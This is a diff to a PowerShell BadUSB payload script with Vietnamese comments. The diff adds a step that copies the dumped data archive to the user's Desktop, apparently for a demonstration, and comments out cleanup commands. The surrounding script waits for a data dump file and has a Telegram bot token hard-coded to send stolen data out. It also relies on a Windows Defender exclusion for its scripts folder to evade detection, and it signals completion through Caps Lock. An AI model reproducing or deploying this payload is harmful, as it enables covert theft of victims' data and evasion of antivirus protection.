@@ -43,6 +43,14 @@ while (!(Test-Path "$dumpFile")) {
     Start-Sleep -Seconds 1
 }
 
+# ===============================================================================
+# [THÊM MỚI] LƯU LẠI BẢN SAO RA MÀN HÌNH DESKTOP ĐỂ DEMO DỄ NHÌN
+# ===============================================================================
+$desktopPath = "$env:USERPROFILE\Desktop\DuLieu_BadUSB_$env:USERNAME.zip"
+Copy-Item -Path $dumpFile -Destination $desktopPath -Force
+# ===============================================================================
+
+
 # Telegram configuration
 $token = "8671014944:AAEfUUYGPdYuhVHYdBKq1EFqoNLbPMS99QQ"
 # $chatID = "8671014944"
@@ -88,8 +96,13 @@ $fileStream.Close()
 $fileStream.Dispose()
 
 Set-Location C:\Users\Public\Documents
-Remove-Item -Recurse -Force scripts
-Remove-MpPreference -ExclusionPath "C:\Users\Public\Documents\scripts" -Force
+
+# ===============================================================================
+# [CHỈNH SỬA] ĐÃ VÔ HIỆU HÓA LỆNH XÓA ĐỂ GIỮ LẠI FILE TRONG CÙNG THƯ MỤC
+# ===============================================================================
+# Remove-Item -Recurse -Force scripts
+# Remove-MpPreference -ExclusionPath "C:\Users\Public\Documents\scripts" -Force
+# ===============================================================================
 
 # Caps Lock signal
 $keyBoardObject = New-Object -ComObject WScript.Shell
